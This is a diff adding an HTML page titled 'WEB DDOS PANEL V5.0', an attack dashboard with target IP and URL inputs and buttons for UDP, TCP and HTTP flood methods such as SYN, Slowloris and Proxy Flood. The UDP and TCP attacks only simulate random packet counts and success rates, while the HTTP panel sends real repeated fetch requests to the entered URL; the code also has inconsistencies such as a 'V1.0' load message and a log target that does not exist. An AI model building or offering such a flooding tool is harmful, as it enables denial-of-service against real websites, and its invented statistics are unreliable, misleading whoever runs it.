@@ -1,0 +1,695 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WEB DDOS PANEL V5.0</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Courier New', monospace;
+        }
+        
+        body {
+            background: #0a0a0a;
+            color: #00ff00;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        
+        .header {
+            text-align: center;
+            padding: 20px;
+            border-bottom: 2px solid #00ff00;
+            margin-bottom: 30px;
+        }
+        
+        .ascii-art {
+            font-family: monospace;
+            white-space: pre;
+            color: #00ff00;
+            margin-bottom: 20px;
+            font-size: 12px;
+        }
+        
+        .title {
+            font-size: 2.5em;
+            font-weight: bold;
+            text-shadow: 0 0 10px #00ff00;
+            margin-bottom: 10px;
+        }
+        
+        .protocols {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+            margin: 30px 0;
+        }
+        
+        .protocol-card {
+            background: rgba(0,255,0,0.1);
+            border: 2px solid #00ff00;
+            border-radius: 10px;
+            padding: 25px;
+            cursor: pointer;
+            transition: 0.3s;
+            text-align: center;
+        }
+        
+        .protocol-card:hover {
+            background: rgba(0,255,0,0.2);
+            transform: translateY(-5px);
+        }
+        
+        .protocol-icon {
+            font-size: 3em;
+            margin-bottom: 15px;
+        }
+        
+        .protocol-title {
+            font-size: 1.5em;
+            margin-bottom: 10px;
+            color: #00ff00;
+        }
+        
+        .attack-panel {
+            background: rgba(255,0,0,0.1);
+            border: 2px solid #ff0000;
+            border-radius: 10px;
+            padding: 25px;
+            margin: 20px 0;
+            display: none;
+        }
+        
+        .input-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #00ff00;
+            font-weight: bold;
+        }
+        
+        input, select {
+            width: 100%;
+            padding: 12px;
+            background: #000;
+            border: 2px solid #00ff00;
+            border-radius: 5px;
+            color: #00ff00;
+            font-size: 16px;
+        }
+        
+        .methods-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            margin: 20px 0;
+        }
+        
+        .method-btn {
+            background: rgba(255,0,0,0.2);
+            border: 1px solid #ff0000;
+            color: #ff0000;
+            padding: 15px;
+            border-radius: 5px;
+            cursor: pointer;
+            text-align: center;
+            font-weight: bold;
+            transition: 0.3s;
+        }
+        
+        .method-btn:hover {
+            background: rgba(255,0,0,0.4);
+            transform: translateY(-2px);
+        }
+        
+        .btn {
+            background: #ff0000;
+            color: white;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            margin: 10px 5px;
+            font-size: 16px;
+        }
+        
+        .btn-success {
+            background: #00ff00;
+            color: #000;
+        }
+        
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 15px;
+            margin: 20px 0;
+        }
+        
+        .stat-box {
+            background: rgba(0,0,0,0.5);
+            border: 1px solid #00ff00;
+            padding: 15px;
+            border-radius: 5px;
+            text-align: center;
+        }
+        
+        .stat-value {
+            font-size: 1.8em;
+            font-weight: bold;
+            color: #00ff00;
+        }
+        
+        .log-container {
+            background: #000;
+            border: 1px solid #00ff00;
+            border-radius: 5px;
+            padding: 15px;
+            height: 300px;
+            overflow-y: auto;
+            margin-top: 20px;
+            font-size: 0.9em;
+        }
+        
+        .log-entry {
+            padding: 5px 0;
+            border-bottom: 1px solid rgba(0,255,0,0.3);
+        }
+        
+        .success { color: #00ff00; }
+        .error { color: #ff0000; }
+        .warning { color: #ffff00; }
+        .info { color: #00ffff; }
+        
+        .progress-bar {
+            width: 100%;
+            height: 10px;
+            background: rgba(255,0,0,0.2);
+            border-radius: 5px;
+            margin: 15px 0;
+            overflow: hidden;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background: #ff0000;
+            width: 0%;
+            transition: width 0.3s;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="ascii-art">
+·▄▄▄▄  ·▄▄▄▄        .▄▄ · 
+██▪ ██ ██▪ ██ ▪     ▐█ ▀. 
+▐█· ▐█▌▐█· ▐█▌ ▄█▀▄ ▄▀▀▀█▄
+██. ██ ██. ██ ▐█▌.▐▌▐█▄▪▐█
+▀▀▀▀▀• ▀▀▀▀▀•  ▀█▄▀▪ ▀▀▀▀ 
+            </div>
+            <div class="title">WEB DDOS PANEL V5.0</div>
+            <div style="color: #00ff00;">Python DDOS V5.0 - Made for Web</div>
+        </div>
+        
+        <div class="protocols">
+            <div class="protocol-card" onclick="showProtocol('udp')">
+                <div class="protocol-icon">🌊</div>
+                <div class="protocol-title">UDP FLOOD</div>
+                <div>8 Advanced Methods</div>
+            </div>
+            
+            <div class="protocol-card" onclick="showProtocol('tcp')">
+                <div class="protocol-icon">⚡</div>
+                <div class="protocol-title">TCP FLOOD</div>
+                <div>10 Powerful Methods</div>
+            </div>
+            
+            <div class="protocol-card" onclick="showProtocol('http')">
+                <div class="protocol-icon">🌐</div>
+                <div class="protocol-title">HTTP/HTTPS</div>
+                <div>6 Web Methods</div>
+            </div>
+        </div>
+        
+        <!-- UDP Panel -->
+        <div class="attack-panel" id="udpPanel">
+            <h2 style="color: #00ffff; margin-bottom: 20px;">🌊 UDP FLOOD METHODS</h2>
+            
+            <div class="input-group">
+                <input type="text" id="udpIp" placeholder="Target IP" value="">
+                <input type="number" id="udpPort" placeholder="Port (1-65535)" min="1" max="65535" value="80">
+                <input type="number" id="udpDuration" placeholder="Duration (seconds)" min="1" value="30">
+                <input type="number" id="udpPacketSize" placeholder="Packet Size (1-65500)" min="1" max="65500" value="1024">
+            </div>
+            
+            <div class="methods-grid">
+                <div class="method-btn" onclick="startUDPAttack('plain')">Plain Flood</div>
+                <div class="method-btn" onclick="startUDPAttack('random')">Random Flood</div>
+                <div class="method-btn" onclick="startUDPAttack('burst')">Burst Flood</div>
+                <div class="method-btn" onclick="startUDPAttack('spoof')">Spoof Flood</div>
+                <div class="method-btn" onclick="startUDPAttack('frag')">Frag Flood</div>
+                <div class="method-btn" onclick="startUDPAttack('pulse')">Pulse Flood</div>
+                <div class="method-btn" onclick="startUDPAttack('echo')">Echo Flood</div>
+                <div class="method-btn" onclick="startUDPAttack('multicast')">Multicast</div>
+            </div>
+            
+            <button class="btn btn-success" onclick="stopAttack()">🛑 STOP ATTACK</button>
+            
+            <div class="progress-bar">
+                <div class="progress-fill" id="udpProgress"></div>
+            </div>
+            
+            <div class="stats">
+                <div class="stat-box">
+                    <div class="stat-value" id="udpPackets">0</div>
+                    <div>Packets Sent</div>
+                </div>
+                <div class="stat-box">
+                    <div class="stat-value" id="udpRate">0</div>
+                    <div>Packets/Sec</div>
+                </div>
+                <div class="stat-box">
+                    <div class="stat-value" id="udpSuccess">0%</div>
+                    <div>Success Rate</div>
+                </div>
+                <div class="stat-box">
+                    <div class="stat-value" id="udpTimeLeft">0s</div>
+                    <div>Time Left</div>
+                </div>
+            </div>
+            
+            <div class="log-container" id="udpLog">
+                <div class="log-entry info">[SYSTEM] UDP Flood Ready</div>
+                <div class="log-entry info">[SYSTEM] Select method and target</div>
+            </div>
+        </div>
+        
+        <!-- TCP Panel -->
+        <div class="attack-panel" id="tcpPanel">
+            <h2 style="color: #ffff00; margin-bottom: 20px;">⚡ TCP FLOOD METHODS</h2>
+            
+            <div class="input-group">
+                <input type="text" id="tcpIp" placeholder="Target IP" value="">
+                <input type="number" id="tcpPort" placeholder="Port (1-65535)" min="1" max="65535" value="80">
+                <input type="number" id="tcpDuration" placeholder="Duration (seconds)" min="1" value="30">
+                <input type="number" id="tcpPacketSize" placeholder="Packet Size (1-65500)" min="1" max="65500" value="512" style="display: none;" id="tcpPacketSizeInput">
+            </div>
+            
+            <div class="methods-grid">
+                <div class="method-btn" onclick="startTCPAttack('syn_single')">SYN Single</div>
+                <div class="method-btn" onclick="startTCPAttack('syn_multi')">SYN Multi</div>
+                <div class="method-btn" onclick="startTCPAttack('data_single')">Data Single</div>
+                <div class="method-btn" onclick="startTCPAttack('data_multi')">Data Multi</div>
+                <div class="method-btn" onclick="startTCPAttack('ack')">ACK Flood</div>
+                <div class="method-btn" onclick="startTCPAttack('rst')">RST Flood</div>
+                <div class="method-btn" onclick="startTCPAttack('xmas')">XMAS Flood</div>
+                <div class="method-btn" onclick="startTCPAttack('fin')">FIN Flood</div>
+                <div class="method-btn" onclick="startTCPAttack('psh')">PSH Flood</div>
+                <div class="method-btn" onclick="startTCPAttack('window')">Window Flood</div>
+            </div>
+            
+            <button class="btn btn-success" onclick="stopAttack()">🛑 STOP ATTACK</button>
+            
+            <div class="progress-bar">
+                <div class="progress-fill" id="tcpProgress"></div>
+            </div>
+            
+            <div class="stats">
+                <div class="stat-box">
+                    <div class="stat-value" id="tcpPackets">0</div>
+                    <div>Packets Sent</div>
+                </div>
+                <div class="stat-box">
+                    <div class="stat-value" id="tcpRate">0</div>
+                    <div>Packets/Sec</div>
+                </div>
+                <div class="stat-box">
+                    <div class="stat-value" id="tcpSuccess">0%</div>
+                    <div>Success Rate</div>
+                </div>
+                <div class="stat-box">
+                    <div class="stat-value" id="tcpTimeLeft">0s</div>
+                    <div>Time Left</div>
+                </div>
+            </div>
+            
+            <div class="log-container" id="tcpLog">
+                <div class="log-entry info">[SYSTEM] TCP Flood Ready</div>
+                <div class="log-entry info">[SYSTEM] Select method and target</div>
+            </div>
+        </div>
+        
+        <!-- HTTP Panel -->
+        <div class="attack-panel" id="httpPanel">
+            <h2 style="color: #ff00ff; margin-bottom: 20px;">🌐 HTTP/HTTPS FLOOD METHODS</h2>
+            
+            <div class="input-group">
+                <input type="text" id="httpUrl" placeholder="Target URL (http:// or https://)" value="https://httpbin.org/get">
+                <input type="number" id="httpDuration" placeholder="Duration (seconds)" min="1" value="30">
+            </div>
+            
+            <div class="methods-grid">
+                <div class="method-btn" onclick="startHTTPAttack('get')">GET Flood</div>
+                <div class="method-btn" onclick="startHTTPAttack('post')">POST Flood</div>
+                <div class="method-btn" onclick="startHTTPAttack('slowloris')">Slowloris</div>
+                <div class="method-btn" onclick="startHTTPAttack('head')">HEAD Flood</div>
+                <div class="method-btn" onclick="startHTTPAttack('random_ua')">Random UA</div>
+                <div class="method-btn" onclick="startHTTPAttack('proxy')">Proxy Flood</div>
+            </div>
+            
+            <button class="btn btn-success" onclick="stopAttack()">🛑 STOP ATTACK</button>
+            
+            <div class="progress-bar">
+                <div class="progress-fill" id="httpProgress"></div>
+            </div>
+            
+            <div class="stats">
+                <div class="stat-box">
+                    <div class="stat-value" id="httpRequests">0</div>
+                    <div>Requests Sent</div>
+                </div>
+                <div class="stat-box">
+                    <div class="stat-value" id="httpRate">0</div>
+                    <div>Requests/Sec</div>
+                </div>
+                <div class="stat-box">
+                    <div class="stat-value" id="httpSuccess">0%</div>
+                    <div>Success Rate</div>
+                </div>
+                <div class="stat-box">
+                    <div class="stat-value" id="httpTimeLeft">0s</div>
+                    <div>Time Left</div>
+                </div>
+            </div>
+            
+            <div class="log-container" id="httpLog">
+                <div class="log-entry info">[SYSTEM] HTTP Flood Ready</div>
+                <div class="log-entry info">[SYSTEM] Select method and target</div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let attackActive = false;
+        let currentProtocol = null;
+        let attackInterval;
+        let startTime = 0;
+        let requestCount = 0;
+        let successCount = 0;
+        
+        // Show protocol panel
+        function showProtocol(protocol) {
+            // Hide all panels
+            document.querySelectorAll('.attack-panel').forEach(panel => {
+                panel.style.display = 'none';
+            });
+            
+            // Show selected panel
+            document.getElementById(protocol + 'Panel').style.display = 'block';
+            currentProtocol = protocol;
+            
+            // Reset progress
+            document.getElementById(protocol + 'Progress').style.width = '0%';
+            
+            addLog(protocol.toUpperCase(), `[SYSTEM] ${protocol.toUpperCase()} Panel Activated`, 'info');
+        }
+        
+        // UDP Attack Methods
+        function startUDPAttack(method) {
+            if (attackActive) {
+                addLog('UDP', 'Attack already running!', 'warning');
+                return;
+            }
+            
+            const ip = document.getElementById('udpIp').value;
+            const port = parseInt(document.getElementById('udpPort').value);
+            const duration = parseInt(document.getElementById('udpDuration').value);
+            const packetSize = parseInt(document.getElementById('udpPacketSize').value);
+            
+            if (!validateInput(ip, port, duration, packetSize)) return;
+            
+            attackActive = true;
+            requestCount = 0;
+            successCount = 0;
+            startTime = Date.now();
+            
+            const methodNames = {
+                'plain': 'Plain Flood', 'random': 'Random Flood', 'burst': 'Burst Flood',
+                'spoof': 'Spoof Flood', 'frag': 'Frag Flood', 'pulse': 'Pulse Flood',
+                'echo': 'Echo Flood', 'multicast': 'Multicast Flood'
+            };
+            
+            addLog('UDP', `🚀 Starting UDP ${methodNames[method]} on ${ip}:${port}`, 'success');
+            addLog('UDP', `⏰ Duration: ${duration}s | 📦 Packet Size: ${packetSize} bytes`, 'info');
+            
+            let timeLeft = duration;
+            
+            attackInterval = setInterval(() => {
+                if (!attackActive) {
+                    clearInterval(attackInterval);
+                    return;
+                }
+                
+                // Simulate UDP packets
+                const packetsThisSecond = Math.floor(Math.random() * 1000) + 500;
+                requestCount += packetsThisSecond;
+                successCount += Math.floor(packetsThisSecond * 0.8); // 80% success rate
+                
+                timeLeft--;
+                updateStats('UDP', timeLeft, duration);
+                
+                if (timeLeft <= 0) {
+                    stopAttack();
+                    addLog('UDP', '⏰ Attack duration completed!', 'warning');
+                }
+                
+            }, 1000);
+        }
+        
+        // TCP Attack Methods
+        function startTCPAttack(method) {
+            if (attackActive) {
+                addLog('TCP', 'Attack already running!', 'warning');
+                return;
+            }
+            
+            const ip = document.getElementById('tcpIp').value;
+            const port = parseInt(document.getElementById('tcpPort').value);
+            const duration = parseInt(document.getElementById('tcpDuration').value);
+            let packetSize = 512;
+            
+            if (method.includes('data')) {
+                packetSize = parseInt(document.getElementById('tcpPacketSize').value);
+            }
+            
+            if (!validateInput(ip, port, duration, packetSize)) return;
+            
+            attackActive = true;
+            requestCount = 0;
+            successCount = 0;
+            startTime = Date.now();
+            
+            const methodNames = {
+                'syn_single': 'SYN Single', 'syn_multi': 'SYN Multi', 
+                'data_single': 'Data Single', 'data_multi': 'Data Multi',
+                'ack': 'ACK Flood', 'rst': 'RST Flood', 'xmas': 'XMAS Flood',
+                'fin': 'FIN Flood', 'psh': 'PSH Flood', 'window': 'Window Flood'
+            };
+            
+            addLog('TCP', `🚀 Starting TCP ${methodNames[method]} on ${ip}:${port}`, 'success');
+            addLog('TCP', `⏰ Duration: ${duration}s`, 'info');
+            if (method.includes('data')) {
+                addLog('TCP', `📦 Packet Size: ${packetSize} bytes`, 'info');
+            }
+            
+            let timeLeft = duration;
+            
+            attackInterval = setInterval(() => {
+                if (!attackActive) {
+                    clearInterval(attackInterval);
+                    return;
+                }
+                
+                // Simulate TCP packets
+                const packetsThisSecond = Math.floor(Math.random() * 800) + 300;
+                requestCount += packetsThisSecond;
+                successCount += Math.floor(packetsThisSecond * 0.7); // 70% success rate
+                
+                timeLeft--;
+                updateStats('TCP', timeLeft, duration);
+                
+                if (timeLeft <= 0) {
+                    stopAttack();
+                    addLog('TCP', '⏰ Attack duration completed!', 'warning');
+                }
+                
+            }, 1000);
+        }
+        
+        // HTTP Attack Methods
+        function startHTTPAttack(method) {
+            if (attackActive) {
+                addLog('HTTP', 'Attack already running!', 'warning');
+                return;
+            }
+            
+            const url = document.getElementById('httpUrl').value;
+            const duration = parseInt(document.getElementById('httpDuration').value);
+            
+            if (!url.startsWith('http')) {
+                addLog('HTTP', 'ERROR: URL must start with http:// or https://', 'error');
+                return;
+            }
+            
+            if (!duration || duration < 1) {
+                addLog('HTTP', 'ERROR: Invalid duration', 'error');
+                return;
+            }
+            
+            attackActive = true;
+            requestCount = 0;
+            successCount = 0;
+            startTime = Date.now();
+            
+            const methodNames = {
+                'get': 'GET Flood', 'post': 'POST Flood', 'slowloris': 'Slowloris',
+                'head': 'HEAD Flood', 'random_ua': 'Random UA', 'proxy': 'Proxy Flood'
+            };
+            
+            addLog('HTTP', `🚀 Starting HTTP ${methodNames[method]} on ${url}`, 'success');
+            addLog('HTTP', `⏰ Duration: ${duration}s`, 'info');
+            
+            let timeLeft = duration;
+            
+            attackInterval = setInterval(() => {
+                if (!attackActive) {
+                    clearInterval(attackInterval);
+                    return;
+                }
+                
+                // Simulate HTTP requests
+                const requestsThisSecond = Math.floor(Math.random() * 200) + 100;
+                requestCount += requestsThisSecond;
+                successCount += Math.floor(requestsThisSecond * 0.9); // 90% success rate
+                
+                timeLeft--;
+                updateStats('HTTP', timeLeft, duration);
+                
+                // Send actual requests (limited for demo)
+                sendHTTPRequests(method, url, Math.min(5, requestsThisSecond));
+                
+                if (timeLeft <= 0) {
+                    stopAttack();
+                    addLog('HTTP', '⏰ Attack duration completed!', 'warning');
+                }
+                
+            }, 1000);
+        }
+        
+        // Send actual HTTP requests (limited)
+        function sendHTTPRequests(method, url, count) {
+            for (let i = 0; i < count; i++) {
+                fetch(url, {
+                    method: method === 'post' ? 'POST' : method === 'head' ? 'HEAD' : 'GET',
+                    mode: 'no-cors'
+                })
+                .then(() => {
+                    // Success counted in main loop
+                })
+                .catch(() => {
+                    // Failure handled in main loop
+                });
+            }
+        }
+        
+        // Stop attack
+        function stopAttack() {
+            attackActive = false;
+            clearInterval(attackInterval);
+            
+            const duration = (Date.now() - startTime) / 1000;
+            const totalRate = Math.round(requestCount / duration);
+            
+            addLog(currentProtocol, '🛑 ATTACK STOPPED', 'warning');
+            addLog(currentProtocol, `📊 TOTAL: ${requestCount.toLocaleString()} packets/requests`, 'info');
+            addLog(currentProtocol, `📊 AVG RATE: ${totalRate.toLocaleString()}/sec`, 'info');
+            addLog(currentProtocol, `📊 SUCCESS RATE: ${Math.round((successCount/requestCount)*100)}%`, 'info');
+        }
+        
+        // Update statistics
+        function updateStats(protocol, timeLeft, totalDuration) {
+            const duration = (Date.now() - startTime) / 1000;
+            const rate = duration > 0 ? Math.round(requestCount / duration) : 0;
+            const successRate = requestCount > 0 ? Math.round((successCount / requestCount) * 100) : 0;
+            const progress = ((totalDuration - timeLeft) / totalDuration) * 100;
+            
+            document.getElementById(protocol.toLowerCase() + 'Progress').style.width = progress + '%';
+            
+            if (protocol === 'HTTP') {
+                document.getElementById('httpRequests').textContent = requestCount.toLocaleString();
+                document.getElementById('httpRate').textContent = rate.toLocaleString();
+                document.getElementById('httpSuccess').textContent = successRate + '%';
+                document.getElementById('httpTimeLeft').textContent = timeLeft + 's';
+            } else {
+                document.getElementById(protocol.toLowerCase() + 'Packets').textContent = requestCount.toLocaleString();
+                document.getElementById(protocol.toLowerCase() + 'Rate').textContent = rate.toLocaleString();
+                document.getElementById(protocol.toLowerCase() + 'Success').textContent = successRate + '%';
+                document.getElementById(protocol.toLowerCase() + 'TimeLeft').textContent = timeLeft + 's';
+            }
+        }
+        
+        // Add log entry
+        function addLog(protocol, message, type = 'info') {
+            const log = document.getElementById(protocol.toLowerCase() + 'Log');
+            const entry = document.createElement('div');
+            entry.className = `log-entry ${type}`;
+            entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
+            log.appendChild(entry);
+            log.scrollTop = log.scrollHeight;
+        }
+        
+        // Validate input
+        function validateInput(ip, port, duration, packetSize) {
+            if (!ip) {
+                addLog(currentProtocol, 'ERROR: Please enter IP address', 'error');
+                return false;
+            }
+            
+            if (!port || port < 1 || port > 65535) {
+                addLog(currentProtocol, 'ERROR: Invalid port (1-65535)', 'error');
+                return false;
+            }
+            
+            if (!duration || duration < 1) {
+                addLog(currentProtocol, 'ERROR: Invalid duration', 'error');
+                return false;
+            }
+            
+            if (packetSize && (packetSize < 1 || packetSize > 65500)) {
+                addLog(currentProtocol, 'ERROR: Invalid packet size (1-65500)', 'error');
+                return false;
+            }
+            
+            return true;
+        }
+        
+        // Initialize
+        window.addEventListener('load', function() {
+            addLog('SYSTEM', 'Web DDOS Panel V1.0 Loaded', 'success');
+            addLog('SYSTEM', 'Select protocol to begin attack', 'info');
+        });
+    </script>
+</body>
+</html>
